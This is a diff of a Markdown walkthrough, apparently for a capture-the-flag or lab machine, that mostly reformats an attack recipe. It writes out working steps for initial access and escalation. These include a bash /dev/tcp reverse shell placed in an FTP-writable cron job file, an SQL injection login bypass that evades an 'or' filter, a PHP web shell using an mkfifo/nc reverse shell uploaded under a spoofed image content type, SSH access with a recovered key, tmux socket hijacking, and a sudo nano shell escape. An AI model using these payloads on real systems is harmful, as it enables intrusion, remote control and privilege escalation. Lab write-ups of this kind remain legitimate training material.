@@ -1,36 +1,47 @@
 ## Initial Access Point 1
+
 1. Log into FTP server (username: anonymous, no password)
+
 ```
 ftp <ip>
 ```
+
 2. Download files from /upload folder
+
 ```
 cd upload
 get job.txt
 get job_log.txt
 ```
+
 3. Observe that a cronjob executes the text in job.txt.
 4. Modify job.txt with reverse shell command
+
 ```
 bash -i >& /dev/tcp/<ip>/<port> 0>&1
 ```
+
 5. Upload modified job.txt file. You will not be able to upload your file without deleting the present one in the FTP server
+
 ```
 delete job.txt
 put job.txt
 ```
+
 6. Start netcat on separate terminal
+
 ```
 nc -lvnp <port>
 ```
 
 ## Initial Access Point 2
 
-SQL Injection (since the or gets sanitized, we can do this "oorr"): 
+SQL Injection (since the or gets sanitized, we can do this "oorr"):
+
 ```
-username = admin' oorr '1' = '1' -- 
+username = admin' oorr '1' = '1' --
 OR
-password = admin' oorr '1' = '1' -- 
+password = admin' oorr '1' = '1' --
 
 # remember to put a space after --
 ```
@@ -38,7 +49,9 @@ password = admin' oorr '1' = '1' --
 ## Initial Access Point 3
 
 Upload File Vulnerability (Reverse shell):
+
 1. upload a php file with the following content:
+
 ```
 <?php
 system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacking IP> <Attacking Port> >/tmp/f");
@@ -46,33 +59,42 @@ system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Attacking IP> <At
 ```
 
 2. Use burp suite/python to intercept the upload file request
+
 ```
 Change the content type to image/png or image/jpeg
 ```
 
 3. Run the command on your attacking machine:
+
 ```
 nc -lvnp <Match the port in the php file>
 ```
 
 4. Go the the following endpoint
+
 ```
 <Victim IP>:5000/uploads/<filename.php>
 ```
 
 ## Horizontal Escalation Vector 1
 
+```
 puttygen /tmp/.sys_cache/.thumb -O private-openssh -o /tmp/converted_id
 chmod 600 /tmp/converted_id
 ssh -i /tmp/converted_id alice@localhost
+```
 
 ## Horizontal Escalation Vector 2
 
+```
 cat /var/log/flaskapp.log
+```
 
 ## Horizontal Escalation Vector 3
 
+```
 tmux -S /tmp/alice_tmux.sock attach -t shared
+```
 
 ## Vertical Escalation Vector 1
 
@@ -81,7 +103,6 @@ sudo -l
 
 sudo nano
 ^R^X
-reset; sh 1>&0 2>&0
 bash
 ```
 
